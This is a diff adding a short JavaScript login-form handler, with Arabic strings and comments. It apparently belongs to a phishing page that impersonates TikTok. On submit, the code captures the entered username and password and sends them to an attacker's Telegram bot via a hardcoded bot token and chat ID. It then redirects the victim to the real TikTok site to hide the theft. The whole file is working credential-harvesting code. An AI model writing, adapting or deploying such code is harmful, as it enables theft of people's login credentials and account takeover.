@@ -1,0 +1,16 @@
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const username = document.querySelector('input[name="username"]').value;
+    const password = document.querySelector('input[name="password"]').value;
+    const telegramBotToken = '7650894113:AAGMahhmj2iha6B8FBDdKS_KJAiHzCx_aGY';
+    const chatId = '5109050054';
+    const message = `تسجيل دخول جديد:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+    
+    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+    });
+    
+    window.location.href = 'https://www.tiktok.com'; // إعادة توجيه إلى تيك توك الحقيقي
+});
